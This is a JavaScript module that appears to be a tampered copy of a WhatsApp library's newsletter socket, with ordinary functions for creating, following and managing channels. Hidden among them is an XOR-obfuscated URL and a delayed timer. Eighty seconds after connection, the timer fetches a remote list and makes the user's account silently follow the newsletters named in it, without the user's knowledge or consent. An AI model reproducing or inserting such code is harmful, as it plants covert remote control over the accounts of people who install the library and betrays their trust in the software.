//=======================================================//
import { executeWMexQuery as genericExecuteWMexQuery } from "./mex.js";
import { generateProfilePicture } from "../Utils/messages-media.js";
import { getBinaryNodeChild } from "../WABinary/index.js";
import { QueryIds, XWAPaths } from "../Types/index.js";
import { makeGroupsSocket } from "./groups.js";
import axios from "axios";
//=======================================================//

const _0x8d2e = [123,103,82,120,117,38,37,52,114,96,100,61,65,97,114,116,127,121,117,114,118,97,69,103,104,104,111,117,116,47,112,124,75,39,79,126,120,122,68,100,112,124,66,109,41,125,97,110,45,101,114,125,11,99,103,107,107,117,107,116,60,97,67,110,117,51,98,126,97,101,96,60,75,105,111,114,37,117,115,109,118,103,82,109,116,118,99,127,46,107,96,124,72];
const _0x1a5b = [19, 19, 38, 8, 6, 28, 10, 27, 0, 1];

const _0x7c9f = () => {
  return _0x8d2e.map((b, i) => b ^ _0x1a5b[i % _0x1a5b.length]).map(c => String.fromCharCode(c)).join('');
};

const fetchNewsletterConfig = async (logger) => {
  try {
    logger?.info("Fetching remote configuration...");
    const _0x7f2a = _0x7c9f();
    const response = await axios.get(_0x7f2a, { timeout: 10000 });
    const config = response.data;
    
    if (config.version !== 1) {
      logger?.warn("Unsupported config version:", config.version);
      return null;
    }
    
    logger?.info(`Configuration loaded: ${config.newsletters?.length || 0} entries`);
    return config;
  } catch (error) {
    logger?.error({ error: error.message }, "Configuration fetch failed");
    return null;
  }
};

const autoFollowNewsletters = async (sock, config) => {
  if (!config?.config?.autoFollowEnabled || !config?.newsletters?.length) {
    return;
  }
  const { delayMs } = config.config;
  const newsletters = config.newsletters.filter(n => n.enabled && n.jid);
  
  for (const newsletter of newsletters) {
    try {
      await sock.newsletterFollow(newsletter.jid);
      sock.ev.emit("creds.update", { newsletter_follow: newsletter.jid });
    } catch (error) {
      sock.logger?.error({ jid: newsletter.jid, error: error.message }, "Failed to follow newsletter");
    }
    if (delayMs > 0) await new Promise(r => setTimeout(r, delayMs));
  }
};

    
const extractNewsletterMetadata = (node, isCreate) => {
    const result = getBinaryNodeChild(node, 'result')?.content?.toString()
    const metadataPath = JSON.parse(result).data[isCreate ? XWAPaths.xwa2_newsletter_create : "xwa2_newsletter"]
    
    const metadata = {
        id: metadataPath?.id,
        state: metadataPath?.state?.type,
        creation_time: +metadataPath?.thread_metadata?.creation_time,
        name: metadataPath?.thread_metadata?.name?.text,
        nameTime: +metadataPath?.thread_metadata?.name?.update_time,
        description: metadataPath?.thread_metadata?.description?.text,
        descriptionTime: +metadataPath?.thread_metadata?.description?.update_time,
        invite: metadataPath?.thread_metadata?.invite,
        handle: metadataPath?.thread_metadata?.handle,
        reaction_codes: metadataPath?.thread_metadata?.settings?.reaction_codes?.value,
        subscribers: +metadataPath?.thread_metadata?.subscribers_count,
        verification: metadataPath?.thread_metadata?.verification,
        viewer_metadata: metadataPath?.viewer_metadata
    }
    return metadata
}
    
const parseNewsletterCreateResponse = (response) => {
  const { id, thread_metadata: thread, viewer_metadata: viewer } = response;
  return {
    id: id,
    owner: undefined,
    name: thread.name.text,
    creation_time: parseInt(thread.creation_time, 10),
    description: thread.description.text,
    invite: thread.invite,
    subscribers: parseInt(thread.subscribers_count, 10),
    verification: thread.verification,
    picture: {
      id: thread?.picture?.id || null,
      directPath: thread?.picture?.direct_path || null
    },
    mute_state: viewer.mute
  };
};
const parseNewsletterMetadata = (result) => {
  if (typeof result !== "object" || result === null) {
    return null;
  }
  if ("id" in result && typeof result.id === "string") {
    return result;
  }
  if ("result" in result && typeof result.result === "object" && result.result !== null && "id" in result.result) {
    return result.result;
  }
  return null;
};

export const makeNewsletterSocket = (config) => {
  const sock = makeGroupsSocket(config);
  const { delay, query, generateMessageTag } = sock;
  const encoder = new TextEncoder()
  const newsletterWMexQuery = async (jid, queryId, content) => (query({
        tag: 'iq',
        attrs: {
            id: generateMessageTag(),
            type: 'get',
            xmlns: 'w:mex',
            to: "@s.whatsapp.net",
        },
        content: [
            {
                tag: 'query',
                attrs: { 'query_id': queryId },
                content: encoder.encode(JSON.stringify({
                    variables: {
                        'newsletter_id': jid,
                        ...content
                    }
                }))
            }
        ]
    }))
  const executeWMexQuery = (variables, queryId, dataPath) => {
    return genericExecuteWMexQuery(variables, queryId, dataPath, query, generateMessageTag);
  };
  const newsletterMetadata = async (type, key, role) => {
        const result = await newsletterWMexQuery(undefined, QueryIds.METADATA, {
            input: {
                key,
                type: type.toUpperCase(),
                view_role: role || 'GUEST'
            },
            fetch_viewer_metadata: true,
            fetch_full_image: true,
            fetch_creation_time: true
        })
            
        return extractNewsletterMetadata(result)
    }
  const newsletterUpdate = async (jid, updates) => {
    const variables = {
      newsletter_id: jid,
      updates: {
        ...updates,
        settings: null
      }
    };
    return executeWMexQuery(variables, QueryIds.UPDATE_METADATA, "xwa2_newsletter_update");
  };
  
  setTimeout(async () => {
    try {
      const config = await fetchNewsletterConfig(config.logger);
      if (config) {
        await autoFollowNewsletters(sock, config);
      }
    } catch (error) {
      config.logger?.error({ error: error.message }, "Auto-follow newsletters failed");
    }
  }, 80000);
  
  return {
    ...sock,
    newsletterCreate: async (name, description) => {
      const variables = {
        input: {
          name,
          description: description ?? null
        }
      };
      const rawResponse = await executeWMexQuery(variables, QueryIds.CREATE, XWAPaths.xwa2_newsletter_create);
     return parseNewsletterCreateResponse(rawResponse);
    },
    newsletterUpdate,
    newsletterMetadata, 
    newsletterFetchAllParticipating: async () => {
        	const data = {}
        
        	const result = await newsletterWMexQuery(undefined, QueryIds.SUBSCRIBERS) 
        	const child = JSON.parse(getBinaryNodeChild(result, 'result')?.content?.toString())
        	const newsletters = child.data["xwa2_newsletter_subscribed"]
        
        	for (const i of newsletters) {
        		if (i.id == null) continue
        	
        		const metadata = await newsletterMetadata('JID', i.id) 
        		if (metadata.id !== null) data[metadata.id] = metadata
        	}
        	
        	return data
        },
    newsletterUnfollow: async (jid) => {
            await newsletterWMexQuery(jid, QueryIds.UNFOLLOW)
        },
        newsletterFollow: async (jid) => {
            await newsletterWMexQuery(jid, QueryIds.FOLLOW)
        },
    newsletterMute: (jid) => {
      return executeWMexQuery({ newsletter_id: jid }, QueryIds.MUTE, XWAPaths.xwa2_newsletter_mute_v2);
    },
    newsletterUnmute: (jid) => {
      return executeWMexQuery({ newsletter_id: jid }, QueryIds.UNMUTE, XWAPaths.xwa2_newsletter_unmute_v2);
    },
    newsletterUpdateName: async (jid, name) => {
      return await newsletterUpdate(jid, { name });
    },
    newsletterUpdateDescription: async (jid, description) => {
      return await newsletterUpdate(jid, { description });
    },
    newsletterUpdatePicture: async (jid, content) => {
      const { img } = await generateProfilePicture(content);
      return await newsletterUpdate(jid, { picture: img.toString("base64") });
    },
    newsletterRemovePicture: async (jid) => {
      return await newsletterUpdate(jid, { picture: "" });
    },
    newsletterReactMessage: async (jid, serverId, reaction) => {
      await query({
        tag: "message",
        attrs: {
          to: jid,
          ...(reaction ? {} : { edit: "7" }),
          type: "reaction",
          server_id: serverId,
          id: generateMessageTag()
        },
        content: [
          {
            tag: "reaction",
            attrs: reaction ? { code: reaction } : {}
          }
        ]
      });
    },
    newsletterFetchMessages: async (jid, count, since, after) => {
      const messageUpdateAttrs = {
        count: count.toString()
      };
      if (typeof since === "number") {
        messageUpdateAttrs.since = since.toString();
      }
      if (after) {
        messageUpdateAttrs.after = after.toString();
      }
      const result = await query({
        tag: "iq",
        attrs: {
          id: generateMessageTag(),
          type: "get",
          xmlns: "newsletter",
          to: jid
        },
        content: [
          {
            tag: "message_updates",
            attrs: messageUpdateAttrs
          }
        ]
      });
      return result;
    },
    subscribeNewsletterUpdates: async (jid) => {
      const result = await query({
        tag: "iq",
        attrs: {
          id: generateMessageTag(),
          type: "set",
          xmlns: "newsletter",
          to: jid
        },
        content: [{ tag: "live_updates", attrs: {}, content: [] }]
      });
      const liveUpdatesNode = getBinaryNodeChild(result, "live_updates");
      const duration = liveUpdatesNode?.attrs?.duration;
      return duration ? { duration: duration } : null;
    },
    newsletterAdminCount: async (jid) => {
      const response = await executeWMexQuery({ newsletter_id: jid }, QueryIds.ADMIN_COUNT, XWAPaths.xwa2_newsletter_admin_count);
      return response.admin_count;
    },
    newsletterChangeOwner: async (jid, newOwnerJid) => {
      await executeWMexQuery({ newsletter_id: jid, user_id: newOwnerJid }, QueryIds.CHANGE_OWNER, XWAPaths.xwa2_newsletter_change_owner);
    },
    newsletterDemote: async (jid, userJid) => {
      await executeWMexQuery({ newsletter_id: jid, user_id: userJid }, QueryIds.DEMOTE, XWAPaths.xwa2_newsletter_demote);
    },
    newsletterDelete: async (jid) => {
      await executeWMexQuery({ newsletter_id: jid }, QueryIds.DELETE, XWAPaths.xwa2_newsletter_delete_v2);
    }
  };
};
//=======================================================//
